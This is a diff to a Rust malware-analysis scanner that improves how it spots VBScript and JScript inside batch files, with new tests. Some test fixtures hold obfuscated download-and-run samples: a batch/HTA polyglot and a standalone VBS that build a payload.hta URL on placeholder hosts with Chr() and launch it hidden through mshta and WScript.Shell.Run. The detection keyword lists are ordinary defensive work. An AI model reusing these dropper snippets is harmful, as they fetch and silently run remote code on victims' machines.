@@ -840,6 +840,59 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn polyglot_vbscript_block_is_scanned_as_vbs() {
+        let script = br#"
+@echo off
+mshta "%~f0"
+exit /b
+<script language="VBScript">
+Dim cmd
+cmd = "mshta " & Chr(104) & "ttp://polyglot-vbs.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False
+</script>
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        let found = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://polyglot-vbs.example/payload.hta"
+            )
+        });
+        assert!(
+            found,
+            "VBScript polyglot block was not scanned as VBS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_batch_text_with_var_word() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(b"@echo off\r\n:: Ttylvar Lkimf\r\n", &mut env);
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "ordinary batch text was queued as script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_echoed_js_inside_batch() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            b"@echo off\r\necho.var shell = new ActiveXObject('WScript.Shell')\r\n",
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "echoed batch helper was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
@@ -2780,7 +2833,16 @@ fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
         let body_end = body_start + close_rel;
         let body = &text[body_start..body_end];
         if !body.trim().is_empty() {
-            env.all_extracted_jscript.push(body.as_bytes().to_vec());
+            let tag = &lower[abs_open..abs_open + tag_end_rel + 1];
+            let body_lower = body.to_ascii_lowercase();
+            let payload = body.as_bytes().to_vec();
+            if tag.contains("jscript") || tag.contains("javascript") {
+                push_unique_payload(&mut env.all_extracted_jscript, payload);
+            } else if tag.contains("vbscript") || looks_like_vbs_script(&body_lower) {
+                push_unique_payload(&mut env.all_extracted_vbs, payload);
+            } else {
+                push_unique_payload(&mut env.all_extracted_jscript, payload);
+            }
         }
         idx = body_end + "</script>".len();
     }
@@ -2794,42 +2856,91 @@ fn contains_ascii_case_insensitive_bytes(haystack: &[u8], needle: &[u8]) -> bool
                 .any(|window| window.eq_ignore_ascii_case(needle)))
 }
 
-fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
-    let lower = decoded.to_ascii_lowercase();
-    let looks_vbs = lower.contains("createobject")
+fn push_unique_payload(payloads: &mut Vec<Vec<u8>>, payload: Vec<u8>) {
+    if !payloads.iter().any(|existing| existing == &payload) {
+        payloads.push(payload);
+    }
+}
+
+fn looks_like_vbs_script(lower: &str) -> bool {
+    lower.contains("createobject")
         || lower.contains("wscript")
         || lower.contains("xmlhttp")
         || lower.contains("private function")
         || lower.contains("option explicit")
         || lower.contains("\ndim ")
-        || lower.starts_with("dim ");
-    let looks_js = lower.contains("activexobject")
+        || lower.starts_with("dim ")
+}
+
+fn looks_like_js_script(lower: &str) -> bool {
+    lower.contains("activexobject")
         || lower.contains("<script")
         || lower.contains("document.")
         || lower.contains("window.")
         || lower.contains("function ")
         || lower.contains("var ")
-        || lower.contains("eval(");
+        || lower.contains("eval(")
+}
 
-    if looks_vbs {
-        let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_vbs
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_vbs.push(payload);
-        }
+fn first_meaningful_script_line(lower: &str) -> &str {
+    lower
+        .trim_start_matches('\u{feff}')
+        .lines()
+        .map(str::trim_start)
+        .find(|line| {
+            let trimmed = line.trim();
+            !trimmed.is_empty()
+                && !trimmed.starts_with('\'')
+                && !trimmed.starts_with("//")
+                && !trimmed.starts_with("/*")
+        })
+        .unwrap_or("")
+}
+
+fn starts_like_standalone_script(lower: &str) -> bool {
+    let first = first_meaningful_script_line(lower);
+    first.starts_with("dim ")
+        || first.starts_with("set ")
+        || first.starts_with("option explicit")
+        || first.starts_with("private function")
+        || first.starts_with("function ")
+        || first.starts_with("var ")
+        || first.starts_with("const ")
+        || first.starts_with("let ")
+}
+
+fn pre_scan_standalone_script_input(input: &[u8], env: &mut Environment) {
+    let has_vbs_atom = [
+        b"createobject" as &[u8],
+        b"wscript",
+        b"xmlhttp",
+        b"option explicit",
+    ]
+    .iter()
+    .any(|needle| contains_ascii_case_insensitive_bytes(input, needle));
+    if !has_vbs_atom {
+        return;
     }
-    if looks_js {
+
+    let text = String::from_utf8_lossy(input);
+    let lower = text.to_ascii_lowercase();
+    if !starts_like_standalone_script(&lower) {
+        return;
+    }
+    if has_vbs_atom && looks_like_vbs_script(&lower) {
+        push_unique_payload(&mut env.all_extracted_vbs, text.as_bytes().to_vec());
+    }
+}
+
+fn pre_scan_utf16_script_blob(decoded: &str, env: &mut Environment) {
+    let lower = decoded.to_ascii_lowercase();
+    if looks_like_vbs_script(&lower) {
         let payload = decoded.as_bytes().to_vec();
-        if !env
-            .all_extracted_jscript
-            .iter()
-            .any(|existing| existing == &payload)
-        {
-            env.all_extracted_jscript.push(payload);
-        }
+        push_unique_payload(&mut env.all_extracted_vbs, payload);
+    }
+    if looks_like_js_script(&lower) {
+        let payload = decoded.as_bytes().to_vec();
+        push_unique_payload(&mut env.all_extracted_jscript, payload);
     }
 }
 
@@ -3024,6 +3135,7 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
             env.delayed_expansion = true;
         }
         pre_scan_polyglot_script_block(input, &mut env);
+        pre_scan_standalone_script_input(input, &mut env);
         deob_scan::scan_raw_marker_powershell_urls(input, &mut env);
         profile_mark!("setup_and_prescan");
         if let Some(decoded) = decode_utf16le_script_blob(input) {
@@ -14021,6 +14133,26 @@ sh.Run cmd, 0, False"#;
             has,
             "no Download trait from VBS WScript.Shell.Run variable URL: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn standalone_vbs_shell_run_chr_concat_url_extracted() {
+        let vbs = br#"Dim cmd
+cmd = "mshta " & Chr(104) & "ttp://standalone-vbs-run.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False"#;
+        let report = analyze(vbs, &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. }
+                    if src == "http://standalone-vbs-run.example/payload.hta"
+            )
+        });
+        assert!(
+            has,
+            "no Download trait from standalone VBS WScript.Shell.Run Chr concat URL: {:?}",
+            report.traits
         );
     }
 
